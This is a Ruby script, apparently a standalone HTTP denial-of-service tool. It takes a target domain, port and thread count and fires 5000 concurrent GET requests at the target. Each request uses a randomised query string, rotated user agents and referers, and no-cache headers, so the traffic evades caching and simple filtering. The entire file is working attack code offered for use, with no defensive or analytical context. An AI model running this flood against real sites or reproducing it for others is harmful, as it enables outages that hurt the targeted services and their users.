#!/usr/bin/ruby

require 'optparse'
require 'net/http'
require 'net/https'

require_relative 'lib/threadpool'



class Http_DDOS

	def initialize()

		@options = {}

		optparse = OptionParser.new do |opts|
  			opts.on('-d', '--domain DOMAIN', 'TARGET DOMAIN') do |domain|
    				@options[:domain] = domain
  			end

  			opts.on('-p', '--port PORT', 'PORT') do |port|
    				@options[:port] = port
  			end

  			opts.on('-t', '--thread THREAD', 'THREAD') do |thread|
    				@options[:thread] = thread
  			end


  			opts.on('-h', '--help', 'Display this screen') do
    				puts opts
    				exit
  			end
		end


		begin
  			optparse.parse!
  			mandatory = [:domain, :port, :thread]                                       
  			missing = mandatory.select{ |param| @options[param].nil? }  
  			unless missing.empty?                                            
    				raise OptionParser::MissingArgument.new(missing.join(', '))    
  			end                                                             
		rescue OptionParser::InvalidOption, OptionParser::MissingArgument      
  			puts $!.to_s                                                          
  			puts optparse                                                         
  			exit                                                                  
		end    

		@pool = Pool.new(@options[:thread].to_i)	

		referer_file = "./data/referer.txt"
		user_agent_file = "./data/user-agents.txt"
		
		@referer_list = read_file_to_list(referer_file)
		@user_agent_list = read_file_to_list(user_agent_file)

		@CHARS = ('0'..'9').to_a + ('A'..'Z').to_a + ('a'..'z').to_a
	end



	def random_char(length)

  		return @CHARS.sort_by { rand }.join[0..length]
	end



	def raw_http(url)

		puts url
		uri = URI.parse(url)
		http = Net::HTTP.new(uri.host, uri.port)
		#http = Net::HTTP::Proxy(@proxy_host, @proxy_port, @proxy_user, @proxy_pass).new(uri.host, uri.port)

                http.open_timeout = 5
                http.read_timeout = 5	

		http.use_ssl = false
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE

		return http
	end


	def http_ddos(url)

		http = raw_http(url)

		new_id = random_char(2)
		new_uri = random_char(4)

    		random_referer = @referer_list[Random.rand(0...@referer_list.size())]
    		random_agent = @user_agent_list[Random.rand(0...@user_agent_list.size())]

		headers = { 'User-Agent' => random_agent,
	    		    'Referer' => random_referer,
	      		    'Cache-Control' => 'no-cache, no-store, must-revalidate', 
			    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
			    'Accept-Language' => 'en-US,en;q=0.5', 
			    'Accept-Encoding' => 'gzip, deflate'
		}

		req = Net::HTTP::Get.new("/?#{new_id}=#{new_uri}", headers)
		begin
			resp = http.request(req)
			puts resp.code
		rescue Exception => err
			puts err.message
		end

	end



	def main

		if @options[:port].to_i == 443
			url = "https://#{@options[:domain]}/"
		else
			url = "http://#{@options[:domain]}/"
		end

		(1..5000).each do |i|
			@pool.schedule do
				http_ddos(url)
			end	
		end	

		at_exit { @pool.shutdown }
	end


	def read_file_to_list(file_path)

  		result = []

		File.open(file_path).each do |line|
			if ! ( line =~ /^($|#)/ )
				result.push(line)
			end
  		end 

  		return result                                                                                                                                                          
	end

end


##
### Main
##


if __FILE__ == $0

	http_ddos = Http_DDOS.new
	http_ddos.main

end


